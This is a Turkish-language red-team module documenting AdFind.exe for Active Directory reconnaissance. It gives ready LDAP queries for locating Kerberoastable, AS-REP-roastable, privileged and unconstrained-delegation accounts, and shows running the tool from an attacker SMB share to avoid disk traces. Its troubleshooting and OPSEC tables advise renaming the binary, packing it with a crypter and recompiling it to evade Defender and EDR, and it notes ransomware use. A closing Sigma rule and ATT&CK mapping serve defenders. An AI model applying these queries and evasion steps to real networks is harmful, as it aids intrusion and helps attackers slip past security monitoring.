# AdFind.exe

> **Kategori:** [3. DİZİN KEŞFİ, GRAF ANALİZİ VE SALDIRI YOLU HARİTALAMA (RECON & BLOODHOUND)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Joe Richards (joeware.net) tarafından C++ ile yazılmış; PowerShell veya .NET bağımlılığı olmadan, Win32 Native LDAP API üzerinden etki alanı keşfi, ACL incelemesi ve nesne dökümü yapan hafif ve ultra hızlı komut satırı aracı.

---

## 1. Genel Bakış ve Amaç

**AdFind.exe**, Active Directory sızma testlerinde, fidye yazılımı (ransomware) operasyonlarında ve kırmızı takım simülasyonlarında en sık başvurulan yerel (native) CLI LDAP sorgulama aracıdır. Joeware tarafından geliştirilen bu ikili, Windows işletim sisteminde PowerShell kısıtlamalarının (Constrained Language Mode, ExecutionPolicy, Script Block Logging) veya .NET Framework sürüm uyumsuzluklarının bulunduğu katı ortamlarda dahi sorunsuz çalışır.

Aracın en büyük mimari avantajı; Microsoft'un yerel **`wldap32.dll`** kütüphanesini doğrudan C++ düzeyinde çağırmasıdır. Hiçbir ek DLL, ajan veya RSAT yönetim paketine ihtiyaç duymaz. Ayrıca bünyesinde barındırdığı önceden tanımlanmış **kısayol makroları (`-sc`)** sayesinde operatörün karmaşık LDAP filtreleri (RFC 2254) ezberlemesine gerek kalmadan tek bir bayrakla (örneğin `-sc trustdmp`, `-sc dclist`, `-sc admincountdmp`) kapsamlı etki alanı dökümleri üretmesini sağlar.

### Mimari Akış Şeması

```
+-----------------------------------------------------------------------------------+
|                              ADFIND.EXE ÇALIŞMA MİMARİSİ                          |
+-----------------------------------------------------------------------------------+
                                          |
                      [Operatör / CMD / PowerShell / C2]
                       AdFind.exe -b <BaseDN> -f <Filtre> [Öznitelikler]
                                          |
                                          v
+-----------------------------------------------------------------------------------+
|                        Win32 Native LDAP Arayüzü                                  |
|     (wldap32.dll / activeds.dll - Saf C++ Yürütme, .NET veya PS Motoru YOK!)      |
+-----------------------------------------------------------------------------------+
                                          |
                                          v
+-----------------------------------------------------------------------------------+
|                        Kimlik Doğrulama Katmanı                                   |
|  - Mevcut Windows Oturumu (SSPI / Kerberos / NTLM Token)                          |
|  - Açık Parametre ile Kimlik Doğrulama (-u user -up pass)                         |
+-----------------------------------------------------------------------------------+
                                          |
                                          v
+-----------------------------------------------------------------------------------+
|                         Ağ İletişimi ve LDAP Protokolü                            |
|             Port 389 (LDAP Standart) veya Port 636 (LDAPS SSL)                    |
|             Port 3268 (Global Catalog / Multi-Domain Forest)                      |
+-----------------------------------------------------------------------------------+
                                          |
                                          v
+-----------------------------------------------------------------------------------+
|                              Hedef Etki Alanı Denetleyicisi                        |
|        Active Directory Veritabanı (Kullanıcılar, Gruplar, Bilgisayarlar, ACL)    |
+-----------------------------------------------------------------------------------+
                                          |
                                          v
+-----------------------------------------------------------------------------------+
|                        Çıktı Biçimlendirme Katmanı                                |
|        - Standart LDIF Formatı (Varsayılan)                                       |
|        - Tablo / Metin Formatı                                                    |
|        - Virgülle Ayrılmış CSV Formatı (-csv / -csvcsv)                           |
+-----------------------------------------------------------------------------------+
```

### Neden Önemli?

| Yetenek | Operasyonel Değer | Savunma Atlatma / OPSEC Boyutu |
|---|---|---|
| **PowerShell & .NET Bağımsızlığı** | Saf C++ Win32 ikilisidir. | PowerShell Script Block (4104) ve .NET ETW izlerini tamamen atlatır. |
| **Kısayol Makroları (`-sc`)** | Tek bayrakla onlarca satırlık LDAP filtrelerini otomatik çalıştırır. | Keşif süresini saniyelere indirir; hata payını sıfırlar. |
| **Bitmask Filtreleme Desteği**| `userAccountControl` bitmask filtrelerini doğrudan çözer. | AS-REP Roastable ve SPN hesaplarını anında ayıklar. |
| **Uzak Paylaşımdan Çalışma** | Diske kopyalamadan `\\attacker\share\adfind.exe` ile çalışır. | Hedef uç noktada dosya oluşturma izi bırakmaz. |

### Alternatif Araçlarla Karşılaştırma

| Kriter | AdFind.exe | dsquery.exe | PowerView.ps1 | SharpView.exe | ldapsearch |
|---|---|---|---|---|---|
| **Geliştirici / Tür** | Joeware (C++) | Microsoft (LOLBin) | PowerShell Script | C# .NET Binary | Linux C Binary |
| **RSAT Bağımlılığı** | **Yok** | **Var (Sunucu/RSAT)**| Yok | Yok | Yok |
| **Script Block Log** | **Üretmez** | Üretmez | **Üretir (4104)** | Üretmez | Üretmez |
| **Kısayol Desteği** | Çok Yüksek (`-sc`)| Kısıtlı | Yok | Yok | Yok |
| **Bitmask Arama** | Dahili Destekli | Zor | Dahili Destekli | Dahili Destekli | Ham OID Gerekir |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

AdFind genel CLI sözdizimi:

```cmd
AdFind.exe [-b AramaKökü] [-f LDAPFiltresi] [ListelenecekÖznitelikler] [Seçenekler]
```

### 2.1 Bağlantı ve Arama Parametreleri

| Parametre | Açıklama | Örnek Kullanım |
|---|---|---|
| `-h` | Hedef Etki Alanı Denetleyicisi IP'si veya FQDN'i (ve isteğe bağlı port). | `-h 10.10.10.10:389` |
| `-b` | Arama kökü (Base DN). Belirtilmezse varsayılan etki alanı kökü kullanılır. | `-b "DC=corp,DC=local"` |
| `-f` | RFC 2254 uyumlu standart veya gelişmiş LDAP arama filtresi. | `-f "(objectCategory=person)"` |
| `-s` | Arama derinliği (`base`, `one`, `sub`). | `-s sub` (Varsayılan) |
| `-u` | Farklı kimlik bilgisiyle sorgulamak için kullanıcı adı. | `-u "corp\jdoe"` |
| `-up` | İlgili kullanıcının parolası. | `-up "P@ssw0rd123"` |
| `-ssl` | LDAPS (port 636) üzerinden güvenli bağlantı kurar. | `-ssl` |
| `-gc` | Global Catalog (port 3268) üzerinden orman çapında arama yapar. | `-gc` |

### 2.2 Çıktı ve Biçimlendirme Parametreleri

| Parametre | Açıklama |
|---|---|
| `-csv` | Sonuçları standart virgülle ayrılmış CSV formatında döker. |
| `-csvdelim <karakter>` | CSV ayırıcısını değiştirir (örneğin noktalı virgül: `-csvdelim ;`). |
| `-nodn` | Çıktılardan ayırt edici ad (`dn: ...`) başlıklarını kaldırır. |
| `-resolvesids` | Nesnelerdeki SID değerlerini insan okunabilir hesap adlarına çevirir. |
| `-recmember` | Grupların iç içe (nested/recursive) tüm üyelerini çözümler. |

### 2.3 Yerleşik Kısayol Makroları (`-sc`)

AdFind'ın en popüler özelliklerinden biri olan kısayol bayrakları:

| Kısayol Bayrağı | Açıklama | Karşılık Gelen Filtre / Eylem |
|---|---|---|
| `-sc dclist` | Etki alanındaki tüm Etki Alanı Denetleyicilerini listeler. | `(primaryGroupID=516)` |
| `-sc trustdmp` | Etki alanının tüm güven ilişkilerini ve yönlerini döker. | `(objectClass=trustedDomain)` |
| `-sc computers_active` | Son 90 gün içinde oturum açmış aktif bilgisayarları getirir. | `lastLogonTimestamp` hesaplaması |
| `-sc admincountdmp` | `adminCount=1` olan tüm korumalı yetkili nesneleri döker. | `(adminCount=1)` |
| `-sc u:<isim>` | Belirtilen kullanıcı adını veya jokerli aramayı sorgular. | `(&(objectCategory=person)(samaccountname=...))` |
| `-sc gpodmp` | Tüm Grup İlkesi Nesnelerini (GPO) listeler. | `(objectCategory=groupPolicyContainer)` |
| `-sc adcs` | Etki alanındaki Active Directory Sertifika Otoritelerini döker. | `(objectCategory=pkiCertificationAuthority)` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Kısayol ile Etki Alanı Denetleyicilerini ve Güven İlişkilerini Listeleme

Etki alanına bağlanıldığında saniyeler içinde DC'leri ve orman güven sınırlarını çıkarma:

```cmd
:: 1. Tüm Domain Controller'ları listeleme
AdFind.exe -sc dclist

:: 2. Güven ilişkilerini dökme
AdFind.exe -sc trustdmp
```

**Konsol Çıktısı Analizi:**

```text
AdFind V01.56.00cpp Joe Richards (joe@joeware.net) April 2023

Using server: dc01.corp.local:389
Directory: Windows Server 2019

dn:CN=CORP-DC01,OU=Domain Controllers,DC=corp,DC=local
>dNSHostName: dc01.corp.local
>operatingsystem: Windows Server 2019 Standard

dn:CN=CORP-DC02,OU=Domain Controllers,DC=corp,DC=local
>dNSHostName: dc02.corp.local
>operatingsystem: Windows Server 2019 Standard

2 Objects returned
```

### Senaryo 2: Kerberoastable SPN Hesaplarını CSV Formatında Çıkarma

Parolası çevrimdışı kırılabilecek servis kullanıcılarını CSV tablosu olarak ayıklama:

```cmd
AdFind.exe -f "(&(objectCategory=person)(servicePrincipalName=*))" sAMAccountName servicePrincipalName -csv > kerberoast.csv
```

### Senaryo 3: AS-REP Roasting için Pre-Auth Kapalı Hesapları Bulma

Kerberos ön kimlik doğrulaması kapatılmış (DONT_REQ_PREAUTH - bit 4194304) hesapları bitmask filtresiyle yakalama:

```cmd
AdFind.exe -f "(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName userAccountControl -nodn
```

### Senaryo 4: Korumalı Yetkili Hesapları (AdminCount=1) Çözümleme

SDHolder mekanizması tarafından korunan ve potansiyel olarak en yüksek yetkili hesapları döker:

```cmd
AdFind.exe -sc admincountdmp sAMAccountName adminCount memberOf
```

### Senaryo 5: Unconstrained Kerberos Delegasyonu Olan Makineleri Bulma

TGT biletlerini bellekte saklayan kısıtlamasız delegasyonlu sunucuları listeleme:

```cmd
AdFind.exe -f "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" sAMAccountName dNSHostName
```

### Senaryo 6: Uzak SMB Paylaşımından Diske Yazmadan Çalıştırma

Hedef uç noktanın sabit diskine hiçbir `.exe` dosyası kopyalamadan, saldırgan makinesindeki açık SMB paylaşımı üzerinden çalıştırma:

```cmd
\\10.10.10.50\tools\AdFind.exe -sc dclist
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Kodu / Mesajı | Olası Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `AdFind: Error 0x51 (81) - Server Down` | İstemci hedef DC'ye TCP 389/636 portundan erişemiyor veya DNS çözülemedi. | `-h <DC_IP>` bayrağı ile doğrudan geçerli DC IP adresini belirtin. Ağ ve güvenlik duvarı izinlerini kontrol edin. |
| `AdFind: Error 0x31 (49) - Invalid Credentials` | `-u` veya `-up` ile sağlanan kimlik bilgileri hatalı veya hesap kilitli. | Kullanıcı adını `DOMAIN\user` formatında yazın; parolayı çift tırnak içine alın. Parametresiz çalıştırarak mevcut oturum token'ını kullanmayı deneyin. |
| `AdFind: Error 0x4 (4) - Size Limit Exceeded` | LDAP sunucusunun tek sorguda döndürebileceği maksimum nesne sayısı (varsayılan: 1000) aşıldı. | AdFind otomatik sayfalama (paging) destekler ancak hata alırsanız `-b` ile arama kökünü daraltın veya `-s one` kullanın. |
| `Defender / EDR: HackTool:Win32/AdFind detected` | Windows Defender veya EDR çözümü AdFind'ın bilinen hash imzasını yakaladı. | Dosya adını değiştirin (örneğin `wmiquery.exe`), ikiliyi UPX veya özel bir crypter ile paketleyin ya da SMB paylaşımından bellek içi çalıştırın. |
| `AdFind: Error 0x54 (84) - Decoding Error` | Dönen LDAP verisinde UTF-8 dışı bozuk karakterler veya desteklenmeyen ikili format var. | Sorgulanan öznitelikler listesini daraltın; ham binary alanları (örneğin `nTSecurityDescriptor`) tek başına istemeyin. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

AdFind, APT grupları ve fidye yazılımı çeteleri (Conti, LockBit, REvil) tarafından sıklıkla kullanıldığı için **dünyadaki neredeyse tüm SOC ve EDR sistemleri tarafından özel olarak izlenen** bir araçtır.

### 5.1 Bırakılan İzler ve Log Kaynakları

1. **İşlem Oluşturma (Process Creation - Event ID 4688 / Sysmon Event ID 1):**
   - Komut satırında `adfind.exe` isminin geçmesi veya `-sc dclist`, `-sc trustdmp` gibi karakteristik parametrelerin bulunması doğrudan kritik alarm üretir.
2. **Windows Security Event ID 4624 (Logon Type 3):**
   - DC tarafında istemciden açılan LDAP bağlantı oturumu loglanır.
3. **PE Başlık ve İmza Bilgileri:**
   - Orijinal Joeware derlemesinin dosya açıklaması (`JoeWare Active Directory Find Tool`) statik analiz motorları tarafından yakalanır.

### 5.2 Ağ ve EDR İmzaları

- **LDAP Ağ Filtreleri:** `(objectCategory=person)`, `(userAccountControl:1.2.840.113556.1.4.803:=...)` gibi belirgin filtreler.
- **RPC / SMB Bağlantısı:** Eğer `\\attacker\share\adfind.exe` uzaktan çalıştırılırsa, SMB oturumu ve UNC yolundan yürütme loglanır.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | AdFind Karşılığı |
|---|---|---|
| **T1087.002** | Account Discovery: Domain Account | `-sc u:`, Kerberoastable & AS-REP filtreleri |
| **T1069.002** | Permission Groups Discovery: Domain Groups | `-sc admincountdmp`, grup sorguları |
| **T1018** | Remote System Discovery | `-sc dclist`, `-sc computers_active` |
| **T1482** | Domain Trust Discovery | `-sc trustdmp` |
| **T1484.001** | Domain Policy Modification: Group Policy Modification | `-sc gpodmp` |

### 5.4 OPSEC Önerileri

| Risk | Tespit Sebebi | OPSEC Önlemi |
|---|---|---|
| **Binary Adı Alarmı** | `adfind.exe` dosya isminin komut satırında yakalanması. | Dosya adını sistemde meşru görünen bir isimle değiştirin (örneğin `netscan.exe` veya `winsync.exe`). |
| **`-sc` Kısayol İmzaları** | `-sc trustdmp`, `-sc dclist` argümanlarının SIEM kurallarına takılması. | Hazır kısayol (`-sc`) kullanmayın; ham ve özelleştirilmiş `-f` LDAP filtreleri yazın. |
| **PE Hash Tespiti** | Joeware derlemesinin bilinen MD5/SHA256 imzası. | İkiliyi binary obfuscator ile yeniden derleyin veya kaynak koddan değişkenleri değiştirerek derleyin. |

### 5.5 Savunma Karşılığı (Blue Team & Detection)

AdFind kullanımını tespit eden örnek Sigma kuralı:

```yaml
title: AdFind Discovery Tool Execution
id: 9a38f2b4-adfind-recon-detection
status: stable
description: Detects the execution of AdFind with common command line switches used in AD reconnaissance.
logsource:
    category: process_creation
    product: windows
detection:
    selection_cmd:
        CommandLine|contains:
            - ' -sc dclist'
            - ' -sc trustdmp'
            - ' -sc computers_active'
            - ' -sc admincountdmp'
            - ' -sc gpodmp'
            - 'userAccountControl:1.2.840.113556.1.4.803'
    selection_img:
        Image|endswith: '\adfind.exe'
    condition: selection_cmd or selection_img
level: critical
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

```cmd
# 1. Etki Alanındaki Tüm DC'leri Listeleme (Kısayol)
adfind.exe -sc dclist
```
- **Ne Yapar?** Etki alanındaki tüm Etki Alanı Denetleyicilerini, işletim sistemlerini ve FQDN'lerini döker.
- **Ne Zaman Kullanılır?** İlk erişim sonrası hedef DC altyapısını haritalarken.
- **Parametreler:** `-sc dclist` yerleşik DC listeleme makrosu.

```cmd
# 2. Etki Alanı Güven İlişkilerini Dökme (Kısayol)
adfind.exe -sc trustdmp
```
- **Ne Yapar?** Bağlı tüm etki alanı güven sınırlarını ve güven yönlerini listeler.
- **Ne Zaman Kullanılır?** Ormanlar arası yatay hareket fırsatları araştırırken.
- **Parametreler:** `-sc trustdmp` güven dökümü makrosu.

```cmd
# 3. SPN Kayıtlı (Kerberoastable) Hesapları CSV Olarak Kaydetme
adfind.exe -f "(&(objectCategory=person)(servicePrincipalName=*))" sAMAccountName servicePrincipalName -csv > spn.csv
```
- **Ne Yapar?** Çevrimdışı parola kırma saldırısı için SPN'li hesapları CSV tablosuna kaydeder.
- **Ne Zaman Kullanılır?** Kerberoasting öncesi servis hesabı envanteri çıkarırken.
- **Parametreler:** `-f` LDAP filtresi; `-csv` formatlayıcı.

```cmd
# 4. AS-REP Roasting için Pre-Auth Kapalı Hesapları Bulma
adfind.exe -f "(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName
```
- **Ne Yapar?** Kerberos ön kimlik doğrulaması kapatılmış kullanıcıları listeler.
- **Ne Zaman Kullanılır?** Parolasız bilet özeti kırma saldırısı için hedef belirlerken.
- **Parametreler:** `4194304` DONT_REQ_PREAUTH UAC bitmask değeridir.

```cmd
# 5. Korumalı Yetkili Hesapları (AdminCount=1) Dökme
adfind.exe -sc admincountdmp sAMAccountName
```
- **Ne Yapar?** AdminSDHolder tarafından korunan tüm yüksek yetkili nesneleri döker.
- **Ne Zaman Kullanılır?** Kritik yönetici hesaplarını tespit etmek için.
- **Parametreler:** `-sc admincountdmp` korumalı hesap makrosu.

```cmd
# 6. Unconstrained Delegasyonlu Bilgisayarları Bulma
adfind.exe -f "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" sAMAccountName dNSHostName
```
- **Ne Yapar?** TGT biletlerini bellekte saklayan kısıtlamasız delegasyonlu sunucuları bulur.
- **Ne Zaman Kullanılır?** PetitPotam / Coerced Auth saldırıları için sıçrama noktası ararken.
- **Parametreler:** `524288` TRUSTED_FOR_DELEGATION bitmask bayrağı.

```cmd
# 7. Son 90 Günde Aktif Olan Bilgisayarları Listeleme
adfind.exe -sc computers_active sAMAccountName
```
- **Ne Yapar?** Etki alanında aktif olarak kullanılan makineleri listeler; bayat kayıtları eler.
- **Ne Zaman Kullanılır?** Canlı hedeflere odaklanarak zaman kazanmak istendiğinde.
- **Parametreler:** `-sc computers_active` aktif bilgisayar makrosu.

```cmd
# 8. Belirli Bir Kullanıcının Bilgilerini Hızlıca Çekme
adfind.exe -sc u:jdoe
```
- **Ne Yapar?** Belirtilen kullanıcı adının tüm LDAP özniteliklerini döker.
- **Ne Zaman Kullanılır?** Şüpheli veya hedef bir hesabı anında derinlemesine incelemek için.
- **Parametreler:** `-sc u:<kullanıcı>` kullanıcı arama kısayolu.

```cmd
# 9. Şifreli LDAPS (Port 636) Üzerinden Sorgu Yapma
adfind.exe -h dc01.corp.local:636 -ssl -sc dclist
```
- **Ne Yapar?** Sorguları TLS şifreli tünel üzerinden ileterek ağ koklayıcılarından gizler.
- **Ne Zaman Kullanılır?** Ağda IDS/NDR izlemesi olan ortamlarda.
- **Parametreler:** `-ssl` port 636 LDAPS şifrelemesi.

```cmd
# 10. Grup İlkesi Nesnelerini (GPO) Dökme
adfind.exe -sc gpodmp displayName gPCFileSysPath
```
- **Ne Yapar?** Tüm GPO'ları ve SYSVOL üzerindeki dosya yollarını döker.
- **Ne Zaman Kullanılır?** Kötü yapılandırılmış GPO dosyalarını analiz ederken.
- **Parametreler:** `-sc gpodmp` GPO döküm makrosu.

---

## Kaynaklar

- **Resmi Joeware Sayfası:** [joeware.net / AdFind](https://www.joeware.net/freetools/tools/adfind/)
- **AdFind Kısayollar Referansı:** [AdFind Shortcut Reference (joeware)](https://www.joeware.net/freetools/tools/adfind/shortcuts.htm)
- **Active Directory UserAccountControl Bitmask:** [Microsoft MS-UAC Reference](https://learn.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties)
- **MITRE ATT&CK Framework:** [Technique T1087 - Account Discovery](https://attack.mitre.org/techniques/T1087/)

---

> **Önceki:** [← adalanche](./adalanche.md) · **Sonraki:** [AdMod.exe →](./AdMod.md)
